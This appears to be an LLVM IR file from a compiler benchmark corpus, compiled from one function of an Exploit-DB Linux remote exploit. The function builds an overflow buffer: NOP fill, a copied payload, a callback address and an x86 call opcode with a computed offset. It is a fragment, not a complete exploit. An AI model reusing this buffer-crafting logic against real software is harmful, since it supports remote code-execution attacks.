; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4533.c_zbuffami.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4533.c_zbuffami.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.target_t = type { i32, i32, i32, i32, i32 }

@NOP = common dso_local global i32 0, align 4
@PAD = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [36 x i8] c"\0A++call back addy: 0x%x, fp:0x%x...\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i8*, %struct.target_t*)* @zbuffami to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @zbuffami(i8* %0, %struct.target_t* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca %struct.target_t*, align 8
  %5 = alloca i64, align 8
  store i8* %0, i8** %3, align 8
  store %struct.target_t* %1, %struct.target_t** %4, align 8
  %6 = load i8*, i8** %3, align 8
  %7 = load i32, i32* @NOP, align 4
  %8 = load %struct.target_t*, %struct.target_t** %4, align 8
  %9 = getelementptr inbounds %struct.target_t, %struct.target_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 4
  %11 = call i32 @memset(i8* %6, i32 %7, i32 %10)
  %12 = load i8*, i8** %3, align 8
  %13 = load %struct.target_t*, %struct.target_t** %4, align 8
  %14 = getelementptr inbounds %struct.target_t, %struct.target_t* %13, i32 0, i32 1
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %12, i64 %16
  %18 = load %struct.target_t*, %struct.target_t** %4, align 8
  %19 = getelementptr inbounds %struct.target_t, %struct.target_t* %18, i32 0, i32 4
  %20 = load i32, i32* %19, align 4
  %21 = load %struct.target_t*, %struct.target_t** %4, align 8
  %22 = getelementptr inbounds %struct.target_t, %struct.target_t* %21, i32 0, i32 4
  %23 = load i32, i32* %22, align 4
  %24 = call i32 @strlen(i32 %23)
  %25 = call i32 @memcpy(i8* %17, i32 %20, i32 %24)
  %26 = load %struct.target_t*, %struct.target_t** %4, align 8
  %27 = getelementptr inbounds %struct.target_t, %struct.target_t* %26, i32 0, i32 2
  %28 = load i32, i32* %27, align 4
  %29 = add nsw i32 %28, 8
  %30 = load %struct.target_t*, %struct.target_t** %4, align 8
  %31 = getelementptr inbounds %struct.target_t, %struct.target_t* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 4
  %33 = sub nsw i32 %29, %32
  %34 = sext i32 %33 to i64
  %35 = load i64, i64* @PAD, align 8
  %36 = add i64 %34, %35
  store i64 %36, i64* %5, align 8
  %37 = load i64, i64* %5, align 8
  %38 = xor i64 %37, -1
  %39 = trunc i64 %38 to i32
  %40 = load %struct.target_t*, %struct.target_t** %4, align 8
  %41 = getelementptr inbounds %struct.target_t, %struct.target_t* %40, i32 0, i32 3
  %42 = load i32, i32* %41, align 4
  %43 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str, i64 0, i64 0), i32 %39, i32 %42)
  %44 = load %struct.target_t*, %struct.target_t** %4, align 8
  %45 = getelementptr inbounds %struct.target_t, %struct.target_t* %44, i32 0, i32 3
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, 255
  %48 = trunc i32 %47 to i8
  %49 = load i8*, i8** %3, align 8
  %50 = load %struct.target_t*, %struct.target_t** %4, align 8
  %51 = getelementptr inbounds %struct.target_t, %struct.target_t* %50, i32 0, i32 2
  %52 = load i32, i32* %51, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %49, i64 %53
  store i8 %48, i8* %54, align 1
  %55 = load %struct.target_t*, %struct.target_t** %4, align 8
  %56 = getelementptr inbounds %struct.target_t, %struct.target_t* %55, i32 0, i32 3
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, 65280
  %59 = ashr i32 %58, 8
  %60 = trunc i32 %59 to i8
  %61 = load i8*, i8** %3, align 8
  %62 = load %struct.target_t*, %struct.target_t** %4, align 8
  %63 = getelementptr inbounds %struct.target_t, %struct.target_t* %62, i32 0, i32 2
  %64 = load i32, i32* %63, align 4
  %65 = add nsw i32 %64, 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %61, i64 %66
  store i8 %60, i8* %67, align 1
  %68 = load %struct.target_t*, %struct.target_t** %4, align 8
  %69 = getelementptr inbounds %struct.target_t, %struct.target_t* %68, i32 0, i32 3
  %70 = load i32, i32* %69, align 4
  %71 = and i32 %70, 16711680
  %72 = ashr i32 %71, 16
  %73 = trunc i32 %72 to i8
  %74 = load i8*, i8** %3, align 8
  %75 = load %struct.target_t*, %struct.target_t** %4, align 8
  %76 = getelementptr inbounds %struct.target_t, %struct.target_t* %75, i32 0, i32 2
  %77 = load i32, i32* %76, align 4
  %78 = add nsw i32 %77, 2
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %74, i64 %79
  store i8 %73, i8* %80, align 1
  %81 = load %struct.target_t*, %struct.target_t** %4, align 8
  %82 = getelementptr inbounds %struct.target_t, %struct.target_t* %81, i32 0, i32 3
  %83 = load i32, i32* %82, align 4
  %84 = and i32 %83, -16777216
  %85 = lshr i32 %84, 24
  %86 = trunc i32 %85 to i8
  %87 = load i8*, i8** %3, align 8
  %88 = load %struct.target_t*, %struct.target_t** %4, align 8
  %89 = getelementptr inbounds %struct.target_t, %struct.target_t* %88, i32 0, i32 2
  %90 = load i32, i32* %89, align 4
  %91 = add nsw i32 %90, 3
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %87, i64 %92
  store i8 %86, i8* %93, align 1
  %94 = load i8*, i8** %3, align 8
  %95 = load %struct.target_t*, %struct.target_t** %4, align 8
  %96 = getelementptr inbounds %struct.target_t, %struct.target_t* %95, i32 0, i32 2
  %97 = load i32, i32* %96, align 4
  %98 = add nsw i32 %97, 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %94, i64 %99
  store i8 -24, i8* %100, align 1
  %101 = load i64, i64* %5, align 8
  %102 = xor i64 %101, -1
  %103 = and i64 %102, 255
  %104 = trunc i64 %103 to i8
  %105 = load i8*, i8** %3, align 8
  %106 = load %struct.target_t*, %struct.target_t** %4, align 8
  %107 = getelementptr inbounds %struct.target_t, %struct.target_t* %106, i32 0, i32 2
  %108 = load i32, i32* %107, align 4
  %109 = add nsw i32 %108, 5
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8, i8* %105, i64 %110
  store i8 %104, i8* %111, align 1
  %112 = load i64, i64* %5, align 8
  %113 = xor i64 %112, -1
  %114 = and i64 %113, 65280
  %115 = lshr i64 %114, 8
  %116 = trunc i64 %115 to i8
  %117 = load i8*, i8** %3, align 8
  %118 = load %struct.target_t*, %struct.target_t** %4, align 8
  %119 = getelementptr inbounds %struct.target_t, %struct.target_t* %118, i32 0, i32 2
  %120 = load i32, i32* %119, align 4
  %121 = add nsw i32 %120, 6
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %117, i64 %122
  store i8 %116, i8* %123, align 1
  %124 = load i64, i64* %5, align 8
  %125 = xor i64 %124, -1
  %126 = and i64 %125, 16711680
  %127 = lshr i64 %126, 16
  %128 = trunc i64 %127 to i8
  %129 = load i8*, i8** %3, align 8
  %130 = load %struct.target_t*, %struct.target_t** %4, align 8
  %131 = getelementptr inbounds %struct.target_t, %struct.target_t* %130, i32 0, i32 2
  %132 = load i32, i32* %131, align 4
  %133 = add nsw i32 %132, 7
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8, i8* %129, i64 %134
  store i8 %128, i8* %135, align 1
  %136 = load i64, i64* %5, align 8
  %137 = xor i64 %136, -1
  %138 = and i64 %137, 4278190080
  %139 = lshr i64 %138, 24
  %140 = trunc i64 %139 to i8
  %141 = load i8*, i8** %3, align 8
  %142 = load %struct.target_t*, %struct.target_t** %4, align 8
  %143 = getelementptr inbounds %struct.target_t, %struct.target_t* %142, i32 0, i32 2
  %144 = load i32, i32* %143, align 4
  %145 = add nsw i32 %144, 8
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8, i8* %141, i64 %146
  store i8 %140, i8* %147, align 1
  %148 = load i8*, i8** %3, align 8
  %149 = load %struct.target_t*, %struct.target_t** %4, align 8
  %150 = getelementptr inbounds %struct.target_t, %struct.target_t* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 4
  %152 = add nsw i32 %151, 1
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds i8, i8* %148, i64 %153
  store i8 0, i8* %154, align 1
  ret void
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @printf(i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
